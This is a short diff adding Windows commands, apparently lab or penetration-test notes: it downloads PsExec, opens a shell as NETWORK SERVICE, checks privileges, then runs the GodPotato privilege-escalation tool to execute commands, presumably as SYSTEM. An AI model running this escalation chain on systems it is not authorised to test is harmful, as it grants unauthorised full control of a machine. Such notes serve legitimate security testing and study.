@@ -1,0 +1,20 @@
+# Create working directory
+mkdir C:\temp
+cd C:\temp
+
+# Download PSExec using PowerShell
+powershell -c "Invoke-WebRequest -Uri 'https://live.sysinternals.com/PsExec.exe' -OutFile 'C:\temp\PsExec.exe'"
+
+cd C:\temp
+PsExec.exe -i -u "NT AUTHORITY\NETWORK SERVICE" cmd.exe
+
+whoami
+
+whoami /priv
+
+
+# Navigate to where GodPotato is located
+cd C:\temp
+
+# Test basic command
+GodPotato.exe -cmd "whoami"
